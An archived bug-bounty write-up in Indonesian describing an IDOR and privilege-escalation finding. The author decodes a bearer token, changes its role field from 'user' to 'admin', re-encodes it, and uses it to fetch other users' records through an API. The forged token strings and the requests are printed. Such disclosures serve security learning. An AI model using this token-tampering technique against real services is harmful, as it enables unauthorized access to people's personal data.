# Privilege Escalation Lead to Data Breach

- **Source URL:** https://medium.com/@ibnu1337/privilege-escalation-lead-to-data-breach-1e4975c3edaa?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240706075252/https://medium.com/@ibnu1337/privilege-escalation-lead-to-data-breach-1e4975c3edaa
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1583 (id 1583)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Privilege Escalation Lead to Data Breach

Assalamualaikum, Bug Hunter!

Bagaimana Kabarnya ? Semoga Baik-baik saja ya, kali ini saya mau membuat Write Up yang menurut saya Bug ini sangat Menarik untuk dibahas.

Awalnya saya mencoba cari celah di berbagai fitur salahsatunya letak celah keamanan yang sangat sering terjadi Data Breach yaitu IDOR atau insecure direct object reference yang mana celah keamanan ini sangat rentan dieksploitasi, jadi untuk skema penyerangannya seperti ilustrasi dibawah ini :

Seperti yang yang tertera pada gambar diatas, setiap akun users memiliki ID yang didalam ID tersebut tersimpan berbagai Object seperti Nama, Alamat, Email, Nomor HP dll. Misalnya ketika users membuka halaman Profil, itu terdapat ID seperti contoh :

https://example.com/users?id=1

Nah, biasanya attacker mencoba untuk mengulik ID tersebut dengan mengubahnya seperti berikut :

https://example.com/users?id=2

dan apabila halaman tersebut menampilkan data users lain yang memiliki id 2 disinilah letak celah keamanan tersebut.

**Melakukan Penyerangan**

Baik, disini saya mencoba membuka halaman profile dan mendapatkan Request yang mengarah ke Endpoint GET /api/v1/users/me dengan menampilkan data :

{“id”:1337, “role”:”user”, “name”:”attacker”, “email”:”attacker@evil.net”}


Kemudian, saya mencoba untuk mengubah Request yang mengarah ke Endpoint GET /api/v1/users/me menjadi GET /api/v1/users?id=123 dan menampilkan Response seperti berikut :

{“status”:403, “error”:true, “message”:”anda tidak memiliki hak akses administrator”}


Oke, tidak apa untuk memecahkan masalah ini, ternyata pada Request Header terdapat Authorization Bearer yang kurang lebih isinya seperti berikut :

eyJpZCI6MTMzNywgInJvbGUiOiJ1c2VyIiwgIm5hbWUiOiJhdHRhY2tlciIsICJlbWFpbCI6ImF0dGFja2VyQGV2aWwubmV0In0.XXXXXXXXXXXXXXXXX


Apabila di Decode maka hasilnya seperti berikut :

{“id”:1337, “role”:”user”, “name”:”attacker”, “email”:”attacker@evil.net”}


Nah, awalnya saya gak kepikiran untuk mengubah “role”:”user” menjadi “role”:”admin”, pada akhirnya saya mencoba untuk mengubah Authorization yang berisi :

{“id”:1337, “role”:”user”, “name”:”attacker”, “email”:”attacker@evil.net”}


Menjadi :

{“id”:1337, “role”:”admin”, “name”:”attacker”, “email”:”attacker@evil.net”}


Lalu, saya encode kembali dan jadilah Authorization Bearer seperti berikut :

eyJpZCI6MTMzNywgInJvbGUiOiJhZG1pbiIsICJuYW1lIjoiYXR0YWNrZXIiLCAiZW1haWwiOiJhdHRhY2tlckBldmlsLm5ldCJ9.XXXXXXXXXXXXXXXXX


Kemudian, saya coba untuk mengakses Endpoint GET /api/v1/users?id=123, dan ketika Request tersebut dijalankan, pada Response menampilkan data :

{“id”:123, “role”:”user”, “name”:”XXX”, “email”:”XXX@XXX.XXX”}


Semoga Informasi ini bermanfaat yaa!
